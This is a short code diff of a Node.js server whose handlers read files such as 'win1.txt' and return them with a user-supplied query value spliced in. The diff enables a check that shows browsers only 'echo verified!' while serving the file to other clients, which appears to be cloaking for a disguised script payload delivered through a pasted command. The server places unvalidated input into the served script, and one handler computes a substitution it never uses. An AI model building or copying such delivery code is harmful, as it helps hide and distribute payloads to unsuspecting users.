@@ -15,19 +15,16 @@ function looksLikeBrowser(req) {
 
 async function showV1(req, res) {
 
-  //if(looksLikeBrowser(req)) return res.send("echo verified!");
-
-  //return res.send(req.query.p);
+  if(looksLikeBrowser(req)) return res.send("echo verified!");
   
   const filePath = path.join(__dirname, '../public', 'win1.txt');
 
   fs.readFile(filePath, "utf8", (err, data) => {
     if (err) {
-      console.error("Error reading file:", err);
+      console.error("Error: 1", err);
       return res.status(500).send("Error reading file");
     }
-
-    const updatedData = data.replace("directory", req.query.p+"\.git");
+    const updatedData = data.replace("directory", req.query.p);
     res.send(updatedData);
   });
 }
@@ -148,6 +145,8 @@ async function showTokenParser1(req, res) {
       console.error('Error: 4', err);
       return res.status(500).send('Error reading file');
     }
+    
+    const updatedData = data.replace("rpath=''", req.query.p+"\.git");
     res.send(data);
   });
 }
